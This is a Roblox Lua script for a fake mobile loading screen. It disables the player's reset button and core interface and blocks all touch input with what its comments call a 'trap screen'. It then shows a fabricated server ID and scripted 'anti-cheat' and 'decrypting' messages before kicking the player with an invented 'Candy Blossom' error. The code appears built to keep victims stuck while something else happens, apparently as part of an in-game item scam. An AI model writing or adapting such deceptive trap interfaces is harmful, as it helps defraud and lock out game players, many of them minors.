-- Mobile-Only Legit Enhanced Loading Screen Script

local UserInputService = game:GetService("UserInputService")
if not UserInputService.TouchEnabled then return end -- Only run on mobile

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 🔒 Disable Reset and Core GUIs
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

-- 🔲 Add Blur Effect
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 24

-- 📵 Block touch input (trap screen)
local blocker = Instance.new("TextButton", playerGui)
blocker.Name = "TouchBlocker"
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.ZIndex = 10000
blocker.Text = ""
blocker.AutoButtonColor = false

-- 📺 ScreenGui Setup
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "LegitLoadingScreen"
screenGui.ResetOnSpawn = false

-- Background
local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BackgroundTransparency = 0.2

-- Info Label (Username & Fake Server ID)
local infoLabel = Instance.new("TextLabel", bg)
infoLabel.Size = UDim2.new(1, 0, 0, 25)
infoLabel.Position = UDim2.new(0, 0, 0.04, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
infoLabel.TextScaled = true
infoLabel.Font = Enum.Font.Gotham
infoLabel.Text = "User: " .. player.Name .. " | Server ID: S-" .. math.random(100000,999999) .. "-" .. math.random(1000,9999)

-- Status Label
local statusLabel = Instance.new("TextLabel", bg)
statusLabel.Size = UDim2.new(1, 0, 0, 50)
statusLabel.Position = UDim2.new(0, 0, 0.45, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.GothamBold
statusLabel.Text = "Loading..."

-- Percent Label
local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(1, 0, 0, 40)
percentLabel.Position = UDim2.new(0, 0, 0.6, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.GothamBold
percentLabel.Text = "0%"

-- Progress bar background
local barFrame = Instance.new("Frame", bg)
barFrame.Size = UDim2.new(0.7, 0, 0.035, 0)
barFrame.Position = UDim2.new(0.15, 0, 0.55, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
barFrame.BorderSizePixel = 0
Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 8)

-- Progress fill
local fill = Instance.new("Frame", barFrame)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
fill.BorderSizePixel = 0
fill.ZIndex = 2
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 8)

-- 🔄 Status messages
local messages = {
    "Initializing Candy Blossom system...",
    "Verifying data integrity...",
    "Locating legacy server node...",
    "Syncing assets...",
    "Running anti-cheat verification...",
    "Decrypting map memory...",
    "Finalizing teleport parameters...",
    "Completing session..."
}

-- 🧠 Simulate loading with legit-feeling updates
task.spawn(function()
    for i = 1, 100 do
        local progress = i
        percentLabel.Text = progress .. "%"
        fill.Size = UDim2.new(progress / 100, 0, 1, 0)

        if i % 12 == 0 then
            local index = ((i // 12 - 1) % #messages) + 1
            statusLabel.Text = messages[index]
        end

        wait(math.random(0.1, 0.25)) -- Randomized speed for realism
    end

    -- ✅ Done: Restore UI and kick
    blur:Destroy()
    blocker:Destroy()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    player:Kick("Legacy server failed to initialize Candy Blossom. Please rejoin.")
end)
